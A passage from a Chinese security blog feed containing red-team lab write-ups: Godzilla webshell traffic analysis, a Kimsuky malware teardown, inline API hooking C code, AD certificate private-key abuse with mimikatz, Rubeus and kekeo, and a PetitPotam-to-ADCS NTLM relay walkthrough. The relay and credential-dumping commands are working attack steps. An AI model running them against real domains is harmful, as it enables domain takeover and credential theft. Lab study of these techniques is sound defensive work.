截断取0-16</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/7cb53e08b7bb685b.png" alt=""></p><p>check返回对应的状态<br><img src="https://i.bmp.ovh/imgs/2021/09/45892a92032b58d9.png" alt=""></p><p>这里分析的payloadModel对应shells/payloads/php/PhpShell.class</p><pre><code>* 返回http对象* 返回对应的shell编码</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/f99a65c395d7cd8e.png" alt=""></p><p>test函数<br>（发送test关键字-&gt;加密后，判断返回数据结果解密后是否存在ok，如果是则代表成功）<br><img src="https://i.bmp.ovh/imgs/2021/09/0af41e6126380b52.png" alt=""></p><p>evalFunc函数<br>获取对应的class name添加到 ReqParameter类型中，调用format返回base64编码后的结果，并开始拼接POST传输的参数，最后调用sendHttpResponse函数发送请求<br><img src="https://i.bmp.ovh/imgs/2021/09/77b11af83b4f41e1.png" alt=""></p><p>format函数<br><img src="https://i.bmp.ovh/imgs/2021/09/32314f9b3751fef5.png" alt=""></p><p>sendHttpResponse函数经过几重包装</p><pre><code>* 将上面base64编码的结果进行最终加密* 最后POST发送pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/98468b20d2285e45.png" alt=""></p><p>encode函数对应PHP_XOR_BASE64里的</p><pre><code>* 根据配置的密钥进行xor编码* 最后base64，拼接到pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/03ab31c2007cd287.png" alt=""></p><p>burp捕获配置时的三个包：<br>第一个发送大马数据，返回session ID<br><img src="https://i.bmp.ovh/imgs/2021/09/2507ef51b7a27ea5.png" alt=""></p><p>第二和第三个都是对应payload的test函数<br><img src="https://i.bmp.ovh/imgs/2021/09/706a3bd4df8d6d59.png" alt=""></p><p>完成这些步骤之后，调用对应的功能就是调用大马里对应的函数<br>参考链接:<a href="https://www.freebuf.com/sectool/285693.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/285693.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文主要是分析哥斯拉流量协议实现的过程&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;版本:v1.0&lt;br&gt;有效荷载:Phpdynxxxxx&lt;br&gt;加密器:php_xor_</summary>
      
    
    
    
    
    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
    
  </entry>
  
  <entry>
    <title>Kimsuky 间谍活动分析</title>
    <link href="http://422926799.github.io/posts/5c51f955.html"/>
    <id>http://422926799.github.io/posts/5c51f955.html</id>
    <published>2021-08-26T17:25:04.000Z</published>
    <updated>2021-08-26T17:39:05.501Z</updated>
    
    <content type="html"><![CDATA[<p>事件背景:韩国外交部文件及其通讯的诱饵<br>样本地址：<a href="https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection</a><br><img src="https://z3.ax1x.com/2021/08/27/hKMneI.png" alt=""></p><p>type：Javascript<br>sha256：20eff877aeff0afaa8a5d29fe272bdd61e49779b9e308c4a202ad868a901a5cd<br>size：27.31 MB（28634023 字节）</p><p>一共有两段base64<br>打开是一段js解码base64写入诱饵pdf，第二段base64解码后在利用certutil解码得到UPX加壳的dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMKTP.png" alt=""></p><p>regsvr32调用dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMlY8.png" alt=""></p><p>诱饵PDF如下<br><img src="https://z3.ax1x.com/2021/08/27/hKMGlQ.png" alt=""></p><p>脱了UPX壳后的dll<br>sha256：ae50cf4339ff2f2b3a50cf8e8027b818b18a0582e143e842bf41fdb00e0bfba5<br>type：DLL x64<br>size：474.50 KB（485888 字节）<br><img src="https://z3.ax1x.com/2021/08/27/hKMJyj.png" alt=""></p><p>由于混淆严重，整体分析过程如下：<br><img src="https://z3.ax1x.com/2021/08/27/hKMYOs.png" alt=""></p><p>先反调试检查，遍历所有设备，查看对应设备的目录，然后提取.txt,hwp,.pdf,.doc,.xls,.ppt后缀的文件最后文件上传,键盘输入hook匹配到<br>指定的字符串写入到log.txt最后回传，注册表写入dll所在路径开机自启regsvr32<br><img src="https://z3.ax1x.com/2021/08/27/hKMfk6.png" alt=""></p><p>（反调试检查）<br><img src="https://z3.ax1x.com/2021/08/27/hKMo1e.png" alt=""></p><p>（遍历所有设备）<br><img src="https://z3.ax1x.com/2021/08/27/hKMq0I.png" alt=""></p><p>（获取C盘目录下的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMjtf.png" alt=""></p><p>（搜索指定后缀的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMvh8.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQpcQ.png" alt=""></p><p>（键盘输入Hook，输入某些字符串匹配后写入到log.txt）<br><img src="https://z3.ax1x.com/2021/08/27/hKQ9Xj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQENV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQAA0.png" alt=""></p><p>（文件上传到远端）<br><img src="https://z3.ax1x.com/2021/08/27/hKQe9U.png" alt=""></p><p>参考链接:<a href="https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign" target="_blank" rel="noopener">https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;事件背景:韩国外交部文件及其通讯的诱饵&lt;br&gt;样本地址：&lt;a href=&quot;https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>Inline Hook研究</title>
    <link href="http://422926799.github.io/posts/3d0703bd.html"/>
    <id>http://422926799.github.io/posts/3d0703bd.html</id>
    <published>2021-08-18T17:31:25.000Z</published>
    <updated>2021-08-18T17:44:49.732Z</updated>
    
    <content type="html"><![CDATA[<p>Inline Hook是在程序调用某个API函数之前，在其上方设置指令跳转到自己写的的函数</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>Hoo kMessageBox测试<br>x86思路如下:</p><pre><code>1.调用 GetModuleHandle 来获取到模块的基址(user32.dll)2.调用 GetProcAddress 获取到MessageBoxA弹窗的基址3.调用 VirtualProtect 来修改MsgBox前5个字节内存属性4.计算 Dest - MsgBox - 5 重定位跳转地址，并Jmp跳转5.计算 Dest + Offset + 5 = MsgBox +5 跳转回来</code></pre><p>疑问：为什么是5个字节？，jmp指令的机器码刚好5字节 </p><pre><code>E9 87 FE FF FF</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/5fa3973bebe61edb.png" alt=""></p><p>而在调用MessageBoxA API之前的保存栈堆新开堆栈时刚好够5字节（机器码共5个字节，<strong>这种情况适用于大部分API但并非全部API都适用</strong>）</p><pre><code>8B FF mov edi,pdi55 push ebp //新栈顶8B EC mov ebp,esp //保留堆栈Hook后这些指令就变成了一条jmp指令</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/e50facfac63f4c54.png" alt=""></p><p>最终在OD类似如下<br><img src="https://i.bmp.ovh/imgs/2021/08/639e3b28efd2c5ea.png" alt=""></p><p>x86内嵌asm hook实现如下：</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef int (WINAPI        *MessageBox_type) (               __in_opt HWND hWnd,               __in_opt LPCSTR lpText,               __in_opt LPCSTR lpCaption,               __in UINT uType);MessageBox_type RealMessageBox = MessageBoxA;//我们自己的MessageBox，每调用MessageBox都要跳到myMessageBox来处理_declspec(naked)  void WINAPImyMessageBox(        __in_opt HWND hWnd,        __in_opt LPCSTR lpText,        __in_opt LPCSTR lpCaption,        __in UINT uType){        __asm        {               PUSH ebp               mov ebp, esp               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               push esi        }        //下面打印MessageBox参数        printf(&quot;hwnd:%8X lpText:%s lpCaption:%s,uType:%8X&quot;, hWnd, lpText, lpCaption,  uType);        __asm        {               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               pop esi               mov ebx, RealMessageBox               add ebx, 5 //地址恢复避免重复hook               jmp ebx        }}#pragma pack(1)typedef struct _JMPCODE{        BYTE jmp;        DWORD addr;}JMPCODE, *PJMPCODE;VOID HookMessageBoxA(){        JMPCODE jcode;        jcode.jmp = 0xe9;//jmp        jcode.addr = (DWORD)myMessageBox - (DWORD)RealMessageBox - 5; //自己的函数地址-MessageBox基址-jmp指令大小        RealMessageBox = MessageBoxA;        ::WriteProcessMemory(GetCurrentProcess(), MessageBoxA, &amp;jcode, sizeof(JMPCODE),  NULL);}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookMessageBoxA();  //hook操作               MessageBoxA(NULL, &quot;HOOK&quot;, &quot;HOOKKKKKK&quot;, MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3500eae2f47e893c.png" alt=""></p><p>x64如下<br>1.备份原来的指令<br>2.8个0x90替换为要跳转的函数地址<br>3.自己的函数中要执行的内容<br>4.恢复原来的指令</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[12] = { 0x00 };BYTE HookCode[12] = { 0x48, 0xB8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFF,   0xE0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 12); // 拷贝原始机器码指令到oldcode               *(PINT64)(HookCode + 2) = (UINT64)lpFunction; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>结果如下：<br><img src="https://i.bmp.ovh/imgs/2021/08/751af19c5be90b0c.png" alt=""></p><p>HookCode刨析：<br><img src="https://i.bmp.ovh/imgs/2021/08/b44d6d77e50cacb0.png" alt=""></p><p>x86话的HookCode为E9 00 00 00 00 （另外个执行例子）还需要减去5字节的便宜地址<br><img src="https://i.bmp.ovh/imgs/2021/08/0a49ec7f3aec9db7.png" alt=""></p><p>x86非内嵌asm，x86要将自己函数处理的地址-被Hook函数+5得出的偏移地址 (至于为什么我也不知道，原文写的不清不楚)</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[5] = { 0x00 };BYTE HookCode[5] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        DWORD dfset = 0;        dfset = (DWORD)lpFunction - ((DWORD)FuncAddress + 5); //偏移地址计算        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 5); // 拷贝原始机器码指令到oldcode               *(PINT32)(HookCode + 1) = (UINT32)dfset; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/2a7df4e7221353fb.png" alt=""></p><p>其他例子SetConsoleTitleW Hook<br><img src="https://i.bmp.ovh/imgs/2021/08/f41515400193bf8d.png" alt=""></p><p>Hook如下，一执行命令cmd的标题就会被更改<br><img src="https://i.bmp.ovh/imgs/2021/08/621519e81c080c2d.png" alt=""></p><p><strong>总的来说x86用内嵌asm，x64用memcpy插机器码</strong></p><h2 id="DetOurs库的使用"><a href="#DetOurs库的使用" class="headerlink" title="DetOurs库的使用"></a>DetOurs库的使用</h2><p>这玩意x64是商业版（<br>github地址:<a href="https://github.com/Microsoft/Detours" target="_blank" rel="noopener">https://github.com/Microsoft/Detours</a><br>下完进入到目录，用vs命令行的nmake编译。然后将lib和include添加到项目<br><img src="https://z3.ax1x.com/2021/08/19/f7sgvd.png" alt=""></p><p>Hook MessageBoxA</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;detours.h&gt;#pragma comment(lib,&quot;detours.lib&quot;)static INT(WINAPI *OldMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA; //定义被Hook的API函数原型INT WINAPI MyMessAgeBoxA(HWND, LPCSTR, LPCSTR, UINT) {        OldMessageBoxA(NULL, &quot;Hook&quot;, &quot;Title&quot;, MB_OK); //注意调用的被hook的函数时要使用自己定义的，否则会崩溃        return 0;}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        int ts;        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               ts = DetourTransactionBegin();               if (ts == NO_ERROR) {                       DetourUpdateThread(GetCurrentThread());                       DetourAttach(&amp;(PVOID&amp;)OldMessageBoxA, MyMessAgeBoxA);                       DetourTransactionCommit();               }               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://z3.ax1x.com/2021/08/19/f7sWDI.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/LyShark/p/11692436.html" target="_blank" rel="noopener">https://www.cnblogs.com/LyShark/p/11692436.html</a><br><a href="https://developer.aliyun.com/article/568432" target="_blank" rel="noopener">https://developer.aliyun.com/article/568432</a><br><a href="https://www.write-bug.com/article/1851.html" target="_blank" rel="noopener">https://www.write-bug.com/article/1851.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Inline Hook是在程序调用某个API函数之前，在其上方设置指令跳转到自己写的的函数&lt;/p&gt;
&lt;h2 id=&quot;实验&quot;&gt;&lt;a href=&quot;#实验&quot; class=&quot;headerlink&quot; title=&quot;实验&quot;&gt;&lt;/a&gt;实验&lt;/h2&gt;&lt;p&gt;Hoo kMessageBox测试</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>滥用证书私钥</title>
    <link href="http://422926799.github.io/posts/75f27601.html"/>
    <id>http://422926799.github.io/posts/75f27601.html</id>
    <published>2021-08-13T20:35:38.000Z</published>
    <updated>2021-08-13T21:16:56.646Z</updated>
    
    <content type="html"><![CDATA[<p>七夕放首老婆的歌</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484058598&auto=1&height=66"></iframe><p>原文链接：<a href="https://www.4hou.com/posts/w2og" target="_blank" rel="noopener">https://www.4hou.com/posts/w2og</a><br>安装证书服务就不说了，自己搜去弄</p><h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><blockquote><p>在传统的kerberos认证的时候，是使用用户密码进行认证的。回顾下申请TGT的过程。<br>用用户hash加密时间戳作为value，type为PA-ENC-TIMESTAMP， 放在PA_DATA上。KDC收到请求，使用用户hash解密value的值得到时间戳跟当前时间做比对，如果在合理的范围(正常五分钟)，就认证通过。<br>事实上也可以使用证书作为认证，这也是这次spectorops关于ADCS研究的最大亮点，后面漏洞紧紧围绕这点。<br>RFC4556引入了对 Kerberos 预身份验证的公钥加密支持。这个RFC 的title是Public Key Cryptography for Initial Authentication in Kerberos，后面我们使用简称PKINIT来介绍使用证书进行kerberos身份认证这种方法。<br>PKINIT同样也使用时间戳，但不是使用用户密码派生密钥加密消息，而是使用属于证书的私钥对消息进行签名。</p></blockquote><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>DC windows server 2019<br>AD CS Windows Server 2008<br>非域内机器windows 7</p><h2 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h2><p>certtmlp.msc - 证书模板控制台<br>certsrv.msc - 证书颁发机构<br>certmgr.msc - 证书管理</p><p>给一域用户安装个用户证书<br>win+r运行certmgr.msc，选择个人，右键，所有任务-&gt;申请新证书。请求证书选择用户（即可生成当前用户的一个证书）<br><img src="https://z3.ax1x.com/2021/08/14/fsXTFU.png" alt=""></p><p>安装后如下<br><img src="https://z3.ax1x.com/2021/08/14/fsX7YF.png" alt=""></p><p>执行certutil -user -store My可以看到用户证书<br><img src="https://z3.ax1x.com/2021/08/14/fsXLl9.png" alt=""></p><h2 id="场景模拟"><a href="#场景模拟" class="headerlink" title="场景模拟"></a>场景模拟</h2><p>假设一台域内机器带有一个用户证书要怎么利用他?<br>先把这个证书dump下来（需要包括私钥）可以用certutil或者直接用certmgr.msc dump</p><pre><code>certutil -user -exportPFX &lt;SHA1 hash&gt; test1.pfx</code></pre><p>（dump的时候需要给证书设置个密码(如果该证书默认没密码的话)）<br><img src="https://z3.ax1x.com/2021/08/14/fsXOyR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/14/fsXXO1.png" alt=""></p><p>（使用certutil导出）<br><img src="https://z3.ax1x.com/2021/08/14/fsXzTK.png" alt=""></p><p>这里有一种情况不能通过这两种方式dump，有些证书在导入的时候需要密码或者<strong>不勾选标志此密钥为可导出的密钥</strong>，需要mimikatz dump<br><img src="https://z3.ax1x.com/2021/08/14/fsj9YD.png" alt=""></p><p>dump出现如下问题<br><img src="https://z3.ax1x.com/2021/08/14/fsjiSH.png" alt=""></p><p>使用mimikatz的crypto::capi修改lsass，然后在dump （这个报错也不影响，具体原因不知）<br>（这证书dump下来如果导入的时候设置了密码也没用，验证根本过不了，也不知道有啥用）</p><pre><code>crypto::capi #修改lsasscrypto::certificates /systemstore:local_machine /store:my /export</code></pre><p>（没以administrator权限执行）<br><img src="https://z3.ax1x.com/2021/08/14/fsjk6A.png" alt=""></p><p>（以administrator权限执行）<br><img src="https://i.bmp.ovh/imgs/2021/08/decd25cc3ceaa229.png" alt=""></p><p>尝试用Rubeus进行申请票据<br>知道证书密码或者dump证书的时候没设置不可dump可自己设置密码</p><pre><code>Rubeus.exe asktgt /user:csadmin /password:123456 /certificate:admin.pfx /domain:joker.local /dc:WIN-0ASLVBO5ID9.joker.local #123456是私钥密码(dump证书的时候设置的)</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3f344d91d72244e3.png" alt=""></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>理论点<br><img src="https://i.bmp.ovh/imgs/2021/08/a735763c31d0fe83.png" alt=""></p><p><strong>在域内利用</strong><br>Rubeus.exe申请票据导入到当前进程，然后获取hash用wmiexec.py连接之类的<br>（清空原有的票据进行测试）<br><img src="https://i.bmp.ovh/imgs/2021/08/f4dd4b544a516e3e.png" alt=""></p><p>Rubeus进行申请票据<br><img src="https://i.bmp.ovh/imgs/2021/08/aa2df3a2f23d4cb5.png" alt=""></p><p>获取hash<br><img src="https://i.bmp.ovh/imgs/2021/08/3969335a61d64673.png" alt=""></p><p><strong>不在域内利用</strong><br>将pfx移动到win7，并导入证书。在hosts文件添加域控IP和加入被控制机器的IP和机器名或者DNS改为域控的IP （代理进内网）<br><img src="https://i.bmp.ovh/imgs/2021/08/ed2393d62b472888.png" alt=""></p><p>利用keke获取ntlm，然后用wmiexec.py连接之类的</p><pre><code>tgt::pac /subject:csadmin /castore:current_user /domain:joker.local</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/0cf25ddee50a166f.png" alt=""></p><p>直接利用mimikatz令牌注入用psexec连接AD CS服务器<br>（pth ntlm到新进程psexec连接）<br><img src="https://i.bmp.ovh/imgs/2021/08/c08063c93c568bc2.png" alt=""></p><h2 id="常见搜索证书的位置"><a href="#常见搜索证书的位置" class="headerlink" title="常见搜索证书的位置"></a>常见搜索证书的位置</h2><blockquote><p>我们经常可以在邮件，磁盘里面看到证书，我们一般按照后缀来搜索证书的，我们一般关注以下后缀<br>1、key后缀的，只包含私钥<br>2、crt/cer 后缀的，只包含公钥<br>3、csr后缀的，证书申请文件，不包含公钥，也不包含私钥。没啥用<br>4、pfx,pem,p12后缀的，包含公私钥，我们最喜欢的。<br>搜索文件后缀的每个人使用的工具不一样，我个人比较喜欢的是SharpSearch，.Net的项目，支持内存加载，可以写成CNA插件。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;七夕放首老婆的歌&lt;/p&gt;
&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/p</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>使用PetitPotam到NTLM中继到域管理员</title>
    <link href="http://422926799.github.io/posts/d55c75ac.html"/>
    <id>http://422926799.github.io/posts/d55c75ac.html</id>
    <published>2021-08-07T11:57:32.000Z</published>
    <updated>2021-08-07T12:47:46.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>最近披露的几个漏洞，分别是：</p><ul><li>MS-EFSRPC – 又名 PetitPotam</li><li>滥用 AD CS 角色的凭证中继<br>任何具有内部网络访问权限的攻击者（例如网络中的网络钓鱼客户端或恶意植入设备）都可以在没有任何初始凭据的情况下接管整个 Active Directory 域。当前在默认配置中，域控制器和 AD CS 容易受到这种攻击。<br>当 PetitPotam 被利用并将 NTLM 凭据中继到 Active Directory 证书服务时，攻击者无需事先对域进行任何身份验证即可获得域管理员权限。本文将详细介绍漏洞利用所需的步骤，然后介绍 PetitPotam 的缓解措施。<br>攻击者可以使用 PetitPotam 触发域控制器以将 NTLM 凭据中继到所选主机。然后可以将域控制器的 NTLM 凭据中继到 Active Directory 证书服务 (AD CS) Web 注册页面，并且可以注册 DC 证书。然后可以使用此证书来请求 TGT（票证授予票证）并通过 Pass-The-Ticket 破坏整个域。<br>AD CS（Active Directory 证书服务）特别有趣，因为<strong>它提供默认接受基于 NTLM 的身份验证的角色服务。这些服务具体包括证书颁发机构 Web 注册和证书注册 Web 服务。</strong></li></ul></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>这几天踩的坑点：不能在DC安装AD证书服务进行测试，必须分开安装，具体情况是反射自身出问题还是什么不知道<br>DC: Windows Server 2019  IP:192.168.93.246<br>AD CS(证书服务器):Windows Server 2008 IP:192.168.93.141<br>Attack Kali IP:192.168.93.133</p><p>准备的工具:</p><ul><li>Rubeus 1.6.4</li><li>mimikatz</li><li>impacket分支(ntlmrelayx-adcs-attack)</li></ul><p>环境搭建过程：<br>（由小离提供的教程）<br><a href="https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf" target="_blank" rel="noopener">https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>证书注册 Web 界面，通过安装证书颁发机构 Web 注册角色。作为在http://<adcsserver>/certsrv/ 上运行的 IIS 托管的 ASP Web 注册应用程序公开</adcsserver></li><li>证书注册服务 (CES)，通过安装证书注册 Web 服务角色。通过安装证书注册策略 Web 服务角色，与证书注册策略 (CEP) Web 服务协同工作。白皮书中的详细信息。</li><li>网络设备注册服务 (NDES)，通过安装网络设备注册服务 角色。作为白皮书中描述的一系列接口公开。</li><li>注册 HTTP 端点没有启用 HTTPS/没有启用任何 NTLM 中继保护（默认允许NTLM）</li><li>GPO 禁用 NTLM 身份验证或将关联的 IIS 应用程序配置为仅接受 Kerberos 身份验证</li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证（运行响应程序或 ntlmrelayx）</li><li>使用 ntlmrelayx 使用“KerberosAuthentication”或“DomainControllers”AD CS 模板将 DC 的凭据中继到启用了 Web 注册（必须启用 NTLM 身份验证并默认启用）的 AD CS（Active Directory 证书服务）服务器。</li><li>获取通过NTLM中继获取的Base64 PKCS12证书</li><li>使用Base64 PKCS12 cert导入Kekeo请求TGT（Ticket Granting Ticket）</li><li>使用 mimikatz 为选择的用户（管理员、Krbtgt 等）转储 LSA 机密</li><li>记下域管理员用户的 NT 哈希值</li><li>使用 wmiexec 以该用户身份获得对域控制器的执行并执行 NT 哈希的哈希传递</li></ol><p>前三步流程图<br><img src="https://z3.ax1x.com/2021/08/07/fMckuT.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载新版impacket切换到ntlmrelayx-adcs-attack分支</p><pre><code>git clone https://github.com/ExAndroidDev/impacket.git # Clone the custom ntlmrelayx repocd impacketgit checkout ntlmrelayx-adcs-attack # checkout to the right branch - this caught me outsudo pip3 install -r requirements.txtsudo python3 setup.py install</code></pre><p>开启监听</p><pre><code>sudo python3 ntlmrelayx.py -debug -smb2support --target http://192.168.93.246/certsrv/certfnsh.asp --adcs --template DomainController</code></pre><p>注：这里模板必须要用DomainController，否则出现以下问题<br><img src="https://z3.ax1x.com/2021/08/07/fMgCIH.jpg" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgwFJ.png" alt="开启监听"></p><p>证书机器执行</p><pre><code>PetitPotam.exe &lt;Attack_IP&gt; &lt;DC_IP&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fMgfFH.png" alt="（执行后在监听那边可以收到base64，这里可能不会出现Attack Sucess关键字但还是成功的）"></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgLTg.png" 